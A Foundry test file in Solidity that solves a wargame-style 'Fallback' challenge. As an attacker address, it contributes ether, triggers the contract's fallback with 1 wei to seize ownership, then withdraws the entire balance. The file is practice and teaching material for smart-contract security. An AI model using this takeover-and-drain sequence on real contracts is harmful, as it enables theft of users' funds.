// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployFallbackScript} from "@script/1_DeployFallback.s.sol";
import {Fallback} from "@main/1_Fallback.sol";

contract FallbackTest is Test, DeployFallbackScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    function setUp() public {

        vm.deal(attacker, 1 ether);
        vm.label(attacker, "Attacker");

        DeployFallbackScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq( fallbackChallenge.owner(), deployer);
        fallbackChallenge.contribute{value: 0.0005 ether}();
        (bool success, ) = address(fallbackChallenge).call{value: 1 wei}("");
        fallbackChallenge.withdraw();
        assertEq(success, true);
        assertEq( fallbackChallenge.owner(), attacker);
        assertEq( address(fallbackChallenge).balance, 0);
       
        vm.stopPrank(  );
    }


}